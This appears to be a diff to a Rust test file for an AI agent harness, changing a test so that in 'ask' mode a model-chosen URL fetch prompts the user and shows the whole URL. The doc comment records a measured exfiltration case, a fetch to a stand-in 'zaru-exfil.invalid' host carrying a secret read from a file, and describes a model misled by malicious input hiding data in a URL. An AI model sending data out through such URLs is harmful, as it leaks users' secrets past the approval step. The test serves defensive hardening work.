@@ -453,35 +453,37 @@ async fn a_refused_destination_is_a_refused_call_and_is_in_the_record() {
     }
 }
 
-/// [ADR-0011] D3's `ask` row does not prompt for a retrieval, read literally.
+/// In `ask` mode a retrieval is asked about, showing the whole URL.
 ///
-/// **This pins the open question rather than answering it.** D3's `ask` row is
-/// "prompts before any write or command" and a retrieval is neither, so at the
-/// default mode a model-chosen URL is fetched with no prompt — which is the
-/// asymmetry the destination rule exists to answer, and which is recorded on
-/// [ADR-0011] as open. If that question is ever answered the other way, this
-/// check reddens, which is how whoever answers it finds every place that
-/// depended on the literal reading.
+/// A URL is a way out of the machine: a model that has read something
+/// malicious can put data in one. Measured on `970f60a`: in `ask` mode with
+/// no terminal, `web.fetch http://zaru-exfil.invalid/?data=SECRET-FROM-FILE`
+/// was decided "permitted" and the request was sent. Ruled by the coordinator
+/// on 2026-09-28, open to Jeshua's veto: in `ask` mode `web.fetch` asks like
+/// any other call that reaches outside the machine.
+///
+/// This check pinned the literal reading of ADR-0011 D3 until then, and was
+/// written to redden the day that question was answered the other way.
 #[tokio::test]
-async fn a_retrieval_is_not_prompted_at_the_default_mode() {
-    println!("== the default mode puts no question about a URL ==");
+async fn a_retrieval_is_asked_about_at_the_default_mode_showing_the_whole_url() {
+    println!("== the default mode asks before a URL is fetched ==");
     let scratch = Scratch::new("prompt");
-    let run = drive(
-        &scratch,
-        Mode::Ask,
-        vec![fetch_call("p1", "http://127.0.0.1:9/nothing")],
-    )
-    .await;
+    let url = "http://127.0.0.1:9/nothing?data=planted-in-the-url";
+    let run = drive(&scratch, Mode::Ask, vec![fetch_call("p1", url)]).await;
 
-    assert!(
-        run.prompts.is_empty(),
-        "ADR-0011 D3's `ask` prompts before a write or a command and a retrieval is neither, so \
-         no question is put; these were: {:?}",
+    assert_eq!(
+        run.prompts.len(),
+        1,
+        "in `ask` mode nobody was asked before a URL the model chose was fetched, so a model \
+         could carry data off the machine in it: {:?}",
         run.prompts
     );
-    // The accepting sibling, in the same file rather than in another: the
-    // confirmer is real and IS consulted for a write, so an executor that
-    // never asked anybody would not satisfy the assertion above.
+    assert!(
+        run.prompts[0].contains(url),
+        "the question must show the whole URL, query and all: {:?}",
+        run.prompts
+    );
+    // The accepting sibling: the same confirmer is consulted for a write too.
     let written = drive(
         &scratch,
         Mode::Ask,
@@ -495,13 +497,10 @@ async fn a_retrieval_is_not_prompted_at_the_default_mode() {
         }],
     )
     .await;
-    assert_eq!(
-        written.prompts.len(),
-        1,
-        "the same confirmer is consulted for a write, so the absence above is about retrievals \
-         rather than about a confirmer nobody wired: {:?}",
-        written.prompts
-    );
+    assert_eq!(written.prompts.len(), 1, "{:?}", written.prompts);
+    // And `yolo` still asks nothing.
+    let yolo = drive(&scratch, Mode::Yolo, vec![fetch_call("p3", url)]).await;
+    assert!(yolo.prompts.is_empty(), "{:?}", yolo.prompts);
 }
 
 /// The descriptor a model is shown carries `url` and nothing else, and it is
